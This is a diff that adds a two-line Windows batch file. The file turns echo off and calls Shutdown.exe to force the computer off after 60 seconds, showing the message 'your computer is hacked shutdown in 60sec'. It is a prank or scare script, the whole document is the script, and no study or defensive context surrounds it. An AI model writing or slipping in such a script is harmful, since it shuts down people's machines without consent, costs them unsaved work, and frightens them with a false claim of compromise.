@@ -1,0 +1,2 @@
+@echo off
+Shutdown.exe -s -t 60 -c "your computer is hacked shutdown in 60sec"
